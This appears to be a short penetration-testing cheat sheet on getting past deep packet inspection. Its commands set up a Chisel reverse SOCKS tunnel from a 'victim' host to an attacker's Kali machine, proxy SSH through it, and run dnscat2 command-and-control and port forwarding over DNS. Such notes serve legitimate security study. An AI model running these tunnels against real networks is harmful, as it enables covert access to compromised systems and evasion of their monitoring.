# Tunneling through Deep Packet Inspection

## Chisel

Run a Chisel server on Kali:
```
chiselkali$ chisel server --port $KaliPort --reverse
```
then monitor the traffic in case it doesn't work:
```
chiselkali$ sudo tcpdump -nvvvXi $SomeInterface tcp port $KaliPort
```
Send the Chiser client to the target and execute it:
```
victim$ chisel client $IpChiselKali:$KaliPort R:socks > /dev/null 2>&1 &
```
Check the opened port on Kali to reuse it:
```
chiselkali$ ss -lntpu # check port for the Socks proxy
```
and use the port to send Socks command (`nc` doesn't support proxying, instead run `ncat`):
```
kali$ sudo apt-get install ncat
kali$ ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:$PortCheckedWithSs %h %p' hackeduser@$IpDbIn
```

## DNS

### Nslookup

```
sudo dnsmasq -C dnsmasq.conf -d
sudo tcpdump -i ensXpY udp port 53
resolvectl status
nslookup somesubzone.mydnsserver.com [victiminternaldns]
```

### Dnscat2

```
dnskali$ dnscat2-server mytld.com
victim$ ./dnscat mytld.com
dnscat2> windows
dnscat2> window -i 1
command> ?
command> listen 127.0.0.1:$AttackerPort $IpDeepIn:$PortService
dnskali$ someservice localhost:$PortService
```
